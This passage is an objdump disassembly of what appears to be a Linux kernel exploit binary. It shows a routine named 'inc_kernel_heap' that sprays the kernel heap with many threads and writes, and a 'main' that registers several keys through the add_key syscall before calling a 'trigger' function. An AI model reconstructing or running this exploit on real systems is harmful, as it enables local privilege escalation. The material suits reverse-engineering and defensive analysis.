  40212f:	48 63 d2             	movslq %edx,%rdx
  402132:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  402135:	ba 00 20 00 00       	mov    $0x2000,%edx
  40213a:	be 60 43 60 00       	mov    $0x604360,%esi
  40213f:	89 c7                	mov    %eax,%edi
  402141:	e8 7a ea ff ff       	callq  400bc0 <write@plt>
  402146:	83 85 ac fe ff ff 01 	addl   $0x1,-0x154(%rbp)
  40214d:	8b 85 ac fe ff ff    	mov    -0x154(%rbp),%eax
  402153:	3b 85 b8 fe ff ff    	cmp    -0x148(%rbp),%eax
  402159:	0f 8c 01 ff ff ff    	jl     402060 <inc_kernel_heap+0xdb>
  40215f:	c7 85 b0 fe ff ff 0b 	movl   $0x350b,-0x150(%rbp)
  402166:	35 00 00 
  402169:	c7 85 ac fe ff ff 00 	movl   $0x0,-0x154(%rbp)
  402170:	00 00 00 
  402173:	eb 42                	jmp    4021b7 <inc_kernel_heap+0x232>
  402175:	8b 85 b0 fe ff ff    	mov    -0x150(%rbp),%eax
  40217b:	8d 50 01             	lea    0x1(%rax),%edx
  40217e:	89 95 b0 fe ff ff    	mov    %edx,-0x150(%rbp)
  402184:	48 98                	cltq   
  402186:	48 8d 95 e0 fe ff ff 	lea    -0x120(%rbp),%rdx
  40218d:	8b 8d ac fe ff ff    	mov    -0x154(%rbp),%ecx
  402193:	48 63 c9             	movslq %ecx,%rcx
  402196:	48 c1 e1 03          	shl    $0x3,%rcx
  40219a:	48 8d 3c 0a          	lea    (%rdx,%rcx,1),%rdi
  40219e:	48 89 c1             	mov    %rax,%rcx
  4021a1:	ba ef 1d 40 00       	mov    $0x401def,%edx
  4021a6:	be 00 00 00 00       	mov    $0x0,%esi
  4021ab:	e8 d0 e9 ff ff       	callq  400b80 <pthread_create@plt>
  4021b0:	83 85 ac fe ff ff 01 	addl   $0x1,-0x154(%rbp)
  4021b7:	83 bd ac fe ff ff 1d 	cmpl   $0x1d,-0x154(%rbp)
  4021be:	7e b5                	jle    402175 <inc_kernel_heap+0x1f0>
  4021c0:	c7 85 ac fe ff ff 00 	movl   $0x0,-0x154(%rbp)
  4021c7:	00 00 00 
  4021ca:	eb 39                	jmp    402205 <inc_kernel_heap+0x280>
  4021cc:	8b 85 ac fe ff ff    	mov    -0x154(%rbp),%eax
  4021d2:	48 98                	cltq   
  4021d4:	48 8b 84 c5 e0 fe ff 	mov    -0x120(%rbp,%rax,8),%rax
  4021db:	ff 
  4021dc:	48 85 c0             	test   %rax,%rax
  4021df:	74 1d                	je     4021fe <inc_kernel_heap+0x279>
  4021e1:	8b 85 ac fe ff ff    	mov    -0x154(%rbp),%eax
  4021e7:	48 98                	cltq   
  4021e9:	48 8b 84 c5 e0 fe ff 	mov    -0x120(%rbp,%rax,8),%rax
  4021f0:	ff 
  4021f1:	be 00 00 00 00       	mov    $0x0,%esi
  4021f6:	48 89 c7             	mov    %rax,%rdi
  4021f9:	e8 f2 ea ff ff       	callq  400cf0 <pthread_join@plt>
  4021fe:	83 85 ac fe ff ff 01 	addl   $0x1,-0x154(%rbp)
  402205:	83 bd ac fe ff ff 1d 	cmpl   $0x1d,-0x154(%rbp)
  40220c:	7e be                	jle    4021cc <inc_kernel_heap+0x247>
  40220e:	48 89 dc             	mov    %rbx,%rsp
  402211:	48 8d 65 d8          	lea    -0x28(%rbp),%rsp
  402215:	5b                   	pop    %rbx
  402216:	41 5c                	pop    %r12
  402218:	41 5d                	pop    %r13
  40221a:	41 5e                	pop    %r14
  40221c:	41 5f                	pop    %r15
  40221e:	5d                   	pop    %rbp
  40221f:	c3                   	retq   

0000000000402220 <main>:
  402220:	55                   	push   %rbp
  402221:	48 89 e5             	mov    %rsp,%rbp
  402224:	48 83 ec 10          	sub    $0x10,%rsp
  402228:	89 7d fc             	mov    %edi,-0x4(%rbp)
  40222b:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  40222f:	8b 35 6b 10 20 00    	mov    0x20106b(%rip),%esi        # 6032a0 <keyring>
  402235:	48 8b 0d 7c 0f 20 00 	mov    0x200f7c(%rip),%rcx        # 6031b8 <userplen>
  40223c:	48 8b 15 55 0f 20 00 	mov    0x200f55(%rip),%rdx        # 603198 <userdesc>
  402243:	48 8b 05 46 0f 20 00 	mov    0x200f46(%rip),%rax        # 603190 <usertype>
  40224a:	41 89 f1             	mov    %esi,%r9d
  40224d:	49 89 c8             	mov    %rcx,%r8
  402250:	b9 a0 31 60 00       	mov    $0x6031a0,%ecx
  402255:	48 89 c6             	mov    %rax,%rsi
  402258:	bf f8 00 00 00       	mov    $0xf8,%edi
  40225d:	b8 00 00 00 00       	mov    $0x0,%eax
  402262:	e8 29 ea ff ff       	callq  400c90 <syscall@plt>
  402267:	89 05 0b 51 20 00    	mov    %eax,0x20510b(%rip)        # 607378 <userkey>
  40226d:	8b 05 d1 20 20 00    	mov    0x2020d1(%rip),%eax        # 604344 <key>
  402273:	83 f8 ff             	cmp    $0xffffffff,%eax
  402276:	75 1e                	jne    402296 <main+0x76>
  402278:	bf c2 25 40 00       	mov    $0x4025c2,%edi
  40227d:	e8 2e e9 ff ff       	callq  400bb0 <puts@plt>
  402282:	bf 07 25 40 00       	mov    $0x402507,%edi
  402287:	e8 54 ea ff ff       	callq  400ce0 <perror@plt>
  40228c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402291:	e9 39 01 00 00       	jmpq   4023cf <main+0x1af>
  402296:	8b 35 04 10 20 00    	mov    0x201004(%rip),%esi        # 6032a0 <keyring>
  40229c:	48 8b 0d e5 0f 20 00 	mov    0x200fe5(%rip),%rcx        # 603288 <plen>
  4022a3:	48 8b 15 1e 0f 20 00 	mov    0x200f1e(%rip),%rdx        # 6031c8 <desc>
  4022aa:	48 8b 05 0f 0f 20 00 	mov    0x200f0f(%rip),%rax        # 6031c0 <type>
  4022b1:	41 89 f1             	mov    %esi,%r9d
  4022b4:	49 89 c8             	mov    %rcx,%r8
  4022b7:	b9 e0 31 60 00       	mov    $0x6031e0,%ecx
  4022bc:	48 89 c6             	mov    %rax,%rsi
  4022bf:	bf f8 00 00 00       	mov    $0xf8,%edi
  4022c4:	b8 00 00 00 00       	mov    $0x0,%eax
  4022c9:	e8 c2 e9 ff ff       	callq  400c90 <syscall@plt>
  4022ce:	89 05 70 20 20 00    	mov    %eax,0x202070(%rip)        # 604344 <key>
  4022d4:	8b 05 6a 20 20 00    	mov    0x20206a(%rip),%eax        # 604344 <key>
  4022da:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4022dd:	75 1e                	jne    4022fd <main+0xdd>
  4022df:	bf c5 25 40 00       	mov    $0x4025c5,%edi
  4022e4:	e8 c7 e8 ff ff       	callq  400bb0 <puts@plt>
  4022e9:	bf 07 25 40 00       	mov    $0x402507,%edi
  4022ee:	e8 ed e9 ff ff       	callq  400ce0 <perror@plt>
  4022f3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4022f8:	e9 d2 00 00 00       	jmpq   4023cf <main+0x1af>
  4022fd:	8b 35 9d 0f 20 00    	mov    0x200f9d(%rip),%esi        # 6032a0 <keyring>
  402303:	48 8b 0d 7e 0f 20 00 	mov    0x200f7e(%rip),%rcx        # 603288 <plen>
  40230a:	48 8b 15 bf 0e 20 00 	mov    0x200ebf(%rip),%rdx        # 6031d0 <desc1>
  402311:	48 8b 05 a8 0e 20 00 	mov    0x200ea8(%rip),%rax        # 6031c0 <type>
  402318:	41 89 f1             	mov    %esi,%r9d
  40231b:	49 89 c8             	mov    %rcx,%r8
  40231e:	b9 20 32 60 00       	mov    $0x603220,%ecx
  402323:	48 89 c6             	mov    %rax,%rsi
  402326:	bf f8 00 00 00       	mov    $0xf8,%edi
  40232b:	b8 00 00 00 00       	mov    $0x0,%eax
  402330:	e8 5b e9 ff ff       	callq  400c90 <syscall@plt>
  402335:	89 05 29 50 20 00    	mov    %eax,0x205029(%rip)        # 607364 <key1>
  40233b:	8b 05 03 20 20 00    	mov    0x202003(%rip),%eax        # 604344 <key>
  402341:	83 f8 ff             	cmp    $0xffffffff,%eax
  402344:	75 1b                	jne    402361 <main+0x141>
  402346:	bf c8 25 40 00       	mov    $0x4025c8,%edi
  40234b:	e8 60 e8 ff ff       	callq  400bb0 <puts@plt>
  402350:	bf 07 25 40 00       	mov    $0x402507,%edi
  402355:	e8 86 e9 ff ff       	callq  400ce0 <perror@plt>
  40235a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40235f:	eb 6e                	jmp    4023cf <main+0x1af>
  402361:	8b 35 39 0f 20 00    	mov    0x200f39(%rip),%esi        # 6032a0 <keyring>
  402367:	48 8b 0d 1a 0f 20 00 	mov    0x200f1a(%rip),%rcx        # 603288 <plen>
  40236e:	48 8b 15 63 0e 20 00 	mov    0x200e63(%rip),%rdx        # 6031d8 <desc2>
  402375:	48 8b 05 44 0e 20 00 	mov    0x200e44(%rip),%rax        # 6031c0 <type>
  40237c:	41 89 f1             	mov    %esi,%r9d
  40237f:	49 89 c8             	mov    %rcx,%r8
  402382:	b9 40 32 60 00       	mov    $0x603240,%ecx
  402387:	48 89 c6             	mov    %rax,%rsi
  40238a:	bf f8 00 00 00       	mov    $0xf8,%edi
  40238f:	b8 00 00 00 00       	mov    $0x0,%eax
  402394:	e8 f7 e8 ff ff       	callq  400c90 <syscall@plt>
  402399:	89 05 a9 1f 20 00    	mov    %eax,0x201fa9(%rip)        # 604348 <key2>
  40239f:	8b 05 9f 1f 20 00    	mov    0x201f9f(%rip),%eax        # 604344 <key>
  4023a5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4023a8:	75 1b                	jne    4023c5 <main+0x1a5>
  4023aa:	bf cb 25 40 00       	mov    $0x4025cb,%edi
  4023af:	e8 fc e7 ff ff       	callq  400bb0 <puts@plt>
  4023b4:	bf 07 25 40 00       	mov    $0x402507,%edi
  4023b9:	e8 22 e9 ff ff       	callq  400ce0 <perror@plt>
  4023be:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4023c3:	eb 0a                	jmp    4023cf <main+0x1af>
  4023c5:	e8 a6 f4 ff ff       	callq  401870 <trigger>
  4023ca:	b8 00 00 00 00       	mov    $0x0,%eax
  4023cf:	c9                   	leaveq 
  4023d0:	c3                   	retq   
  4023d1:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4023d8:	00 00 00 
  4023db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000004023e0 <__libc_csu_init>:
  4023e0:	41 57                	push   %r15
  4023e2:	41 89 ff             	mov    %edi,%r15d
  4023e5:	41 56                	push   %r14
  4023e7:	49 89 f6             	mov    %rsi,%r14
  4023ea:	41 55                	push   %r13
  4023ec:	49 89 d5             	mov    %rdx,%r13
  4023ef:	41 54                	push   %r12
  4023f1:	4c 8d 25 08 0a 20 00 	lea    0x200a08(%rip),%r12        # 602e00 <__frame_dummy_init_array_entry>
  4023f8:	55                   	push   %rbp
  4023f9:	48 8d 2d 08 0a 20 00 	lea    0x200a08(%rip),%rbp        # 602e08 <__init_array_end>
  402400:	53                   	push   %rbx
  402401:	4c 29 e5             	sub    %r12,%rbp
  402404:	31 db                	xor    %ebx,%ebx
  402406:	48 c1 fd 03          	sar    $0x3,%rbp
  40240a:	48 83 ec 08          	sub    $0x8,%rsp
  40240e:	e8 35 e7 ff ff       	callq  400b48 <_init>
  402413:	48 85 ed             	test   %rbp,%rbp
  402416:	74 1e                	je     402436 <__libc_csu_init+0x56>
  402418:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40241f:	00 
  402420:	4c 89 ea             	mov    %r13,%rdx
  402423:	4c 89 f6             	mov    %r14,%rsi
  402426:	44 89 ff             	mov    %r15d,%edi
  402429:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  40242d:	48 83 c3 01          	add    $0x1,%rbx
  402431:	48 39 eb             	cmp    %rbp,%rbx
  402434:	75 ea                	jne    402420 <__libc_csu_init+0x40>
  402436:	48 83 c4 08          	add    $0x8,%rsp
  40243a:	5b                   	pop    %rbx
  40243b:	5d                   	pop    %rbp
  40243c:	41 5c                	pop    %r12
  40243e:	41 5d                	pop    %r13
  402440:	41 5e                	pop    %r14
  402442:	41 5f                	pop    %r15
  402444:	c3                   	retq   
  402445:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  40244c:	00 00 00 00 

0000000000402450 <__libc_csu_fini>:
  402450:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000402454 <_fini>:
  402454:	48 83 ec 08          	sub    $0x8,%rsp
  402458:	48 83 c4 08          	add    $0x8,%rsp
  40245c:	c3                   	retq   
